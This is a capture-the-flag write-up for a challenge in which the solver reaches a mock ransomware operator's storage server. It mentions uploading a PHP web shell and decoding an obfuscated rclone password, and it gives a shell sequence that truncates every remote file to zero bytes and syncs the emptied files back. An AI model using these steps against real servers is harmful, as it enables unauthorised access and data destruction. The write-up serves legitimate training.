# ✅ MISCELLANEOUS - Operation Eradication

Writeup by: [@goproslowyo](https://github.com/goproslowyo)

## Tags

- medium

Files:

- [operation_eradication](./operation_eradication)

## Description

Author: @JohnHammond#6971

Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment! They stole our data!  Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server...  but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?  Download the file(s) below and press the `Start` button on the top-right to begin this challenge.

## Writeup

The way I originally solved this was that I noticed you can upload files. So I uploaded a PHP web shell, logged in (the username is a red-herring and NOT encoded, but the password is, but `rclone reveal` should assist easily here) and deleted the files to get the flag.

However, after talking with someone they put me onto a much more elegant solution to delete the files... zeroing them out. It's almost a three line solution if you don't count the three lines it takes to configure rclone.

```shell
echo '[remote]'>~/.config/rclone/rclone.conf
cat operation_eradication>>~/.config/rclone/rclone.conf
sed -ie 's/localhost/chal.ctf.games:32450/g' ~/.config/rclone/rclone.conf
rclone sync remote: tmp
find ./tmp/ -type f -exec truncate -s 0 {} \;
rclone sync tmp remote:
```
